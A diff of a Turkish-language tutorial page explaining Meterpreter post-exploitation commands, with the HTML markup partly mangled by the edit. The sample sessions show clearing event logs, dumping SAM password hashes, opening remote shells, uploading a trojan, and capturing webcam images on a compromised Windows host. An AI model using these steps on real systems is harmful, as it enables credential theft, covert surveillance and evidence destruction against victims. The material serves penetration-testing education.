@@ -37,17 +37,17 @@ url: /tr/metasploit-icinde-meterpreter-komutlari/
 <!-- /wp:heading -->
 
  
-<h2 class="wp-block-heading" id="help">help</h2>
+<h2 class="wp-block-heading" id="help">help
 <!-- /wp:heading -->
 
   Adından da anlaşılacağı gibi, Meterpreter içinde&nbsp;<code>help</code>&nbsp;komutunu verdiğinizde kullanılabilir komutları listeler ve kısa açıklamaları verir. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> help
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  help
 
 Core Commands
-<strong>=============</strong>
+***=============*** 
 
     Command       Description
     -------       -----------
@@ -59,34 +59,34 @@ Core Commands
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="background">background</h2>
+<h2 class="wp-block-heading" id="background">background
 <!-- /wp:heading -->
 
   <code>background</code>&nbsp;komutu, aktif olan Meterpreter oturumunu (session) arka plana gönderir ve sizi tekrar&nbsp;<code>msf &gt;</code>&nbsp;komut istemcisine getirir. Arka plandaki Meterpreter oturumuna geçmek için&nbsp;<code>sessions</code>&nbsp;komutundan faydalanabilirsiniz. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> background
-msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> sessions -i 1
-<strong>[</strong><strong>*</strong><strong>]</strong> Starting interaction with 1...
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  background
+msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  sessions -i 1
+***[*** ******* ***]***  Starting interaction with 1...
 
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="cat">cat</h2>
+<h2 class="wp-block-heading" id="cat">cat
 <!-- /wp:heading -->
 
   Linux işletim sistemlerinde&nbsp;<code>cat</code>&nbsp;komutu, bir dosya içeriğini ekrana yazdırmada kullanılır. Meterpreterde de aynı işe yarar. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> cat
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  cat
 Usage: cat file
 
 Example usage:
-meterpreter <strong>&gt;</strong> cat edit.txt
+meterpreter ***&gt;***  cat edit.txt
 What you talkin' about Willis
 
 meterpreter &gt;
@@ -94,65 +94,65 @@ meterpreter &gt;
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="cd--pwd">cd &gt; pwd</h2>
+<h2 class="wp-block-heading" id="cd--pwd">cd &gt; pwd
 <!-- /wp:heading -->
 
   <code>cd</code>&nbsp;komutu ile klasör değişimi yapılır.&nbsp;<code>pwd</code>&nbsp;komutu ile aktif olarak hangi klasörde olduğumuz görülebilir. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> pwd
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  pwd
 c:\
-meterpreter <strong>&gt;</strong> cd c:\windows
-meterpreter <strong>&gt;</strong> pwd
+meterpreter ***&gt;***  cd c:\windows
+meterpreter ***&gt;***  pwd
 c:\windows
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="clearev">clearev</h2>
+<h2 class="wp-block-heading" id="clearev">clearev
 <!-- /wp:heading -->
 
-  <code>clearev</code>&nbsp;komutu, Clear Evidence yani delilleri temizleme anlamına gelir. Karşı tarafta açılan oturumda oluşturulan&nbsp;<strong>log</strong>&nbsp;dosyalarını temizlemeye çalışır. 
+  <code>clearev</code>&nbsp;komutu, Clear Evidence yani delilleri temizleme anlamına gelir. Karşı tarafta açılan oturumda oluşturulan&nbsp;***log*** &nbsp;dosyalarını temizlemeye çalışır. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> clearev
-<strong>[</strong><strong>*</strong><strong>]</strong> Wiping 97 records from Application...
-<strong>[</strong><strong>*</strong><strong>]</strong> Wiping 415 records from System...
-<strong>[</strong><strong>*</strong><strong>]</strong> Wiping 0 records from Security...
-meterpreter <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  clearev
+***[*** ******* ***]***  Wiping 97 records from Application...
+***[*** ******* ***]***  Wiping 415 records from System...
+***[*** ******* ***]***  Wiping 0 records from Security...
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="download">download</h2>
+<h2 class="wp-block-heading" id="download">download
 <!-- /wp:heading -->
 
   Karşı bilgisayardan bir dosya indirmeye yarar. İndirilen dosya, metasploit’i başlatırken yerel sisteminizde hangi klasördeyseniz, oraya kaydedilir. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> download c:\\boot.ini
-<strong>[</strong><strong>*</strong><strong>]</strong> downloading: c:\boot.ini -&gt; c:\boot.ini
-<strong>[</strong><strong>*</strong><strong>]</strong> downloaded : c:\boot.ini -&gt; c:\b<a href="http://oot.ini/boot.ini">oot.ini/boot.ini</a>
-meterpreter <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  download c:\\boot.ini
+***[*** ******* ***]***  downloading: c:\boot.ini -&gt; c:\boot.ini
+***[*** ******* ***]***  downloaded : c:\boot.ini -&gt; c:\b<a href="http://oot.ini/boot.ini">oot.ini/boot.ini</a>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="edit">edit</h2>
+<h2 class="wp-block-heading" id="edit">edit
 <!-- /wp:heading -->
 
   <code>edit</code>&nbsp;komutu, karşı taraftaki bilgisayarda bulunan bir dosyayı düzenlemek üzere&nbsp;<code>vim</code>&nbsp;editörde açar. Vim Editör kullanımı için&nbsp;<a href="http://www.vim.org/">Vim</a>&nbsp;sayfasına bakabilirsiniz. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ls
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ls
 
 Listing: C:\Documents and Settings\Administrator\Desktop
-<strong>========================================================</strong>
+***========================================================*** 
 
 Mode              Size    Type  Last modified              Name
 ----              ----    ----  -------------              ----
@@ -161,57 +161,57 @@ Mode              Size    Type  Last modified              Name
 .
 100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt
 
-meterpreter <strong>&gt;</strong> edit edit.txt
+meterpreter ***&gt;***  edit edit.txt
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="execute">execute</h2>
+<h2 class="wp-block-heading" id="execute">execute
 <!-- /wp:heading -->
 
   <code>execute</code>&nbsp;komutu, karşı tarafta bir komut çalıştırmanızı sağlar. Dikkat ederseniz, Meterpreter’in kendi komutları çalıştırılmamakta. Karşı tarafın komut istemcisinde bir komut çalıştırılmaktadır. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> execute -f cmd.exe -i -H
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  execute -f cmd.exe -i -H
 Process 38320 created.
 Channel 1 created.
-Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
-<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.
+Microsoft Windows XP ***[*** Version 5.1.2600]
+***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32&gt;
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="getuid">getuid</h2>
+<h2 class="wp-block-heading" id="getuid">getuid
 <!-- /wp:heading -->
 
   Karşı tarafta Meterpreter’in çalıştığı sistemin kullanıcı kimliğini görüntüler. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> getuid
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  getuid
 Server username: NT AUTHORITY\SYSTEM
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="hashdump">hashdump</h2>
+<h2 class="wp-block-heading" id="hashdump">hashdump
 <!-- /wp:heading -->
 
   <code>hashdump</code>&nbsp;komutu, karşı taraftaki bilgisayarın SAM veri tabanını ortaya çıkarır. Tabii ki önceki Veri tabanı yazımızda belirttiğimiz gibi Workspace kullanıyorsanız,&nbsp;<code>loot</code>&nbsp;tablosuna kayıt eder. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run post/windows/gather/hashdump 
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run post/windows/gather/hashdump 
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Obtaining the boot key...
-<strong>[</strong><strong>*</strong><strong>]</strong> Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
-<strong>[</strong><strong>*</strong><strong>]</strong> Obtaining the user list and keys...
-<strong>[</strong><strong>*</strong><strong>]</strong> Decrypting user keys...
-<strong>[</strong><strong>*</strong><strong>]</strong> Dumping password hashes...
+***[*** ******* ***]***  Obtaining the boot key...
+***[*** ******* ***]***  Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+***[*** ******* ***]***  Obtaining the user list and keys...
+***[*** ******* ***]***  Decrypting user keys...
+***[*** ******* ***]***  Dumping password hashes...
 
 Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
 dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
@@ -219,33 +219,33 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
 SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
 victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="idletime">idletime</h2>
+<h2 class="wp-block-heading" id="idletime">idletime
 <!-- /wp:heading -->
 
   Karşı taraftaki bilgisayar kullanıcısının, ne kadar zamandır işlem yapmadığını gösterir. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> idletime
-User has been idle <strong>for</strong>: 5 hours 26 mins 35 secs
-meterpreter <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  idletime
+User has been idle ***for*** : 5 hours 26 mins 35 secs
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="ipconfig">ipconfig</h2>
+<h2 class="wp-block-heading" id="ipconfig">ipconfig
 <!-- /wp:heading -->
 
   Karşı bilgisayarın ağ bilgilerini görüntüler. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ipconfig
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ipconfig
 
 MS TCP Loopback interface
 Hardware MAC: 00:00:00:00:00:00
@@ -257,29 +257,29 @@ Hardware MAC: 00:0c:29:10:f5:15
 IP Address  : 192.168.1.104
 Netmask     : 255.255.0.0
 
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="lpwd--lcd">lpwd &gt; lcd</h2>
+<h2 class="wp-block-heading" id="lpwd--lcd">lpwd &gt; lcd
 <!-- /wp:heading -->
 
   Meterpreter komut satırı açık iken vereceğiniz komutlar karşı taraf bilgisayarda işlem yaparlar. Halbuki biz kendi bilgisayarımızda bulunduğumuz klasörü görmek veya değiştirmek isteyebiliriz. Bu durumda Meterpreter’i geri plana göndermeden&nbsp;<code>lpwd</code>&nbsp;ve&nbsp;<code>lcd</code>&nbsp;komutlarıyla bu işlemi yapabiliriz.&nbsp;<code>lpwd</code>: Yerel bilgisayarda hangi klasörde olduğumuzu gösterir. (local print working directory)&nbsp;<code>lcd</code>: Yerel bilgisayarda istediğimiz klasöre geçmeye yarar. (local call directory) 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> lpwd
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  lpwd
 /root
 
-meterpreter <strong>&gt;</strong> lcd MSFU
-meterpreter <strong>&gt;</strong> lpwd
+meterpreter ***&gt;***  lcd MSFU
+meterpreter ***&gt;***  lpwd
 /root/MSFU
 
-meterpreter <strong>&gt;</strong> lcd /var/www
-meterpreter <strong>&gt;</strong> lpwd
+meterpreter ***&gt;***  lcd /var/www
+meterpreter ***&gt;***  lpwd
 /var/www
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
@@ -291,10 +291,10 @@ meterpreter <strong>&gt;</strong>
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ls
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ls
 
 Listing: C:\Documents and Settings\victim
-<strong>=========================================</strong>
+***=========================================*** 
 
 Mode              Size     Type  Last modified                   Name
 ----              ----     ----  -------------                   ----
@@ -326,17 +326,17 @@ meterpreter &gt;
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="ps">ps</h2>
+<h2 class="wp-block-heading" id="ps">ps
 <!-- /wp:heading -->
 
   Hedef bilgisayarda çalışan tüm işlemleri görüntüler. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ps
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ps
 
 Process list
-<strong>============</strong>
+***============*** 
 
     PID   Name                  Path
     ---   ----                  ----
@@ -348,7 +348,7 @@ Process list
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="resource">resource</h2>
+<h2 class="wp-block-heading" id="resource">resource
 <!-- /wp:heading -->
 
   Karşı bilgisayara bağlandığınızda, yaptığınız işlemlerin bir süre sonra aynı şeyler olduğunu fark edersiniz. Örneğin,&nbsp;<code>ls</code>&nbsp;komutunu ver,&nbsp;<code>cd c:\\Program Files</code>&nbsp;ile programlar klasörüne gir vb. işlemleri hemen her zaman yaparsınız. İşte yerel bilgisayarda bir dosyaya, her satırda bir komut olacak şekilde bu işlemleri kayıt edip karşı tarafta çalıştırabilirsiniz. Bunun gerçekleşmesi için&nbsp;<code>resource</code>&nbsp;komutu kullanılmaktadır. 
@@ -358,9 +358,9 @@ Process list
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> resource 
-Usage: resource path1 path2Run the commands stored <strong>in </strong>the supplied files.
-meterpreter <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  resource 
+Usage: resource path1 path2Run the commands stored ***in *** the supplied files.
+meterpreter ***&gt;*** 
 ARGUMENTS:
 
 path1:		Yerel klasörümüzde bulunan toplu iş dosyamız.
@@ -372,12 +372,12 @@ background
 root@kali:~#
 Running resource command:
 
-meterpreter&gt; <strong>&gt;</strong> resource resource.txt
-<strong>[</strong><strong>*</strong><strong>]</strong> Reading /root/resource.txt
-<strong>[</strong><strong>*</strong><strong>]</strong> Running ls
+meterpreter&gt; ***&gt;***  resource resource.txt
+***[*** ******* ***]***  Reading /root/resource.txt
+***[*** ******* ***]***  Running ls
 
 Listing: C:\Documents and Settings\Administrator\Desktop
-<strong>========================================================</strong>
+***========================================================*** 
 
 Mode              Size    Type  Last modified              Name
 ----              ----    ----  -------------              ----
@@ -388,92 +388,92 @@ Mode              Size    Type  Last modified              Name
 100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk
 100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Running background
+***[*** ******* ***]***  Running background
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Backgrounding session 1...
-msf  exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong>
+***[*** ******* ***]***  Backgrounding session 1...
+msf  exploit***(*** handler***)***  ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="search">search</h2>
+<h2 class="wp-block-heading" id="search">search
 <!-- /wp:heading -->
 
   Karşı sistemde arama yapmamızı sağlar. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> search -f autoexec.bat
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  search -f autoexec.bat
 Found 1 result...
     c:\AUTOEXEC.BAT
-meterpreter <strong>&gt;</strong> search -f sea<strong>*</strong>.bat c:\\xamp\\
+meterpreter ***&gt;***  search -f sea******* .bat c:\\xamp\\
 Found 1 result...
-    c:\\xampp\perl\b<strong>in</strong>\search.bat <strong>(</strong>57035 bytes<strong>)</strong>
-meterpreter <strong>&gt;</strong>
+    c:\\xampp\perl\b***in*** \search.bat ***(*** 57035 bytes***)*** 
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="shell">shell</h2>
+<h2 class="wp-block-heading" id="shell">shell
 <!-- /wp:heading -->
 
   <code>shell</code>&nbsp;komutu, Meterpreter içinde karşı sistemin Command Prompt satırına girmenizi sağlar. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> shell
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  shell
 Process 39640 created.
 Channel 2 created.
-Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
-<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.
+Microsoft Windows XP ***[*** Version 5.1.2600]
+***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32&gt;
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="upload">upload</h2>
+<h2 class="wp-block-heading" id="upload">upload
 <!-- /wp:heading -->
 
   Karşı sisteme bir dosya yüklemenizi sağlar. Hedef sistemin dosya gösterim notasyonu dikkate alınmalıdır. Ters tırnaklara dikkat edilmelidir. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> upload evil_trojan.exe c:\\windows\\system32
-<strong>[</strong><strong>*</strong><strong>]</strong> uploading  : evil_trojan.exe -&gt; c:\windows\system32
-<strong>[</strong><strong>*</strong><strong>]</strong> uploaded   : evil_trojan.exe -&gt; c:\windows\system32\evil_trojan.exe
-meterpreter <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  upload evil_trojan.exe c:\\windows\\system32
+***[*** ******* ***]***  uploading  : evil_trojan.exe -&gt; c:\windows\system32
+***[*** ******* ***]***  uploaded   : evil_trojan.exe -&gt; c:\windows\system32\evil_trojan.exe
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="webcam_list">webcam_list</h2>
+<h2 class="wp-block-heading" id="webcam_list">webcam_list
 <!-- /wp:heading -->
 
   Hedef sistemde kullanılabilir durumda olan web kameralarını listeler. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> webcam_list
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  webcam_list
 1: Creative WebCam NX Pro
-2: Creative WebCam NX Pro <strong>(</strong>VFW<strong>)</strong>
-meterpreter <strong>&gt;</strong>
+2: Creative WebCam NX Pro ***(*** VFW***)*** 
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="webcam_snap">webcam_snap</h2>
+<h2 class="wp-block-heading" id="webcam_snap">webcam_snap
 <!-- /wp:heading -->
 
   Hedef sistemin web kamerasından bir adet fotoğraf alır ve yerelde bulunduğunuz klasöre .jpeg formatında kayıt eder. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> webcam_snap -i 1 -v false
-<strong>[</strong><strong>*</strong><strong>]</strong> Starting...
-<strong>[</strong>+] Got frame
-<strong>[</strong><strong>*</strong><strong>]</strong> Stopped
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  webcam_snap -i 1 -v false
+***[*** ******* ***]***  Starting...
+***[*** +] Got frame
+***[*** ******* ***]***  Stopped
 Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
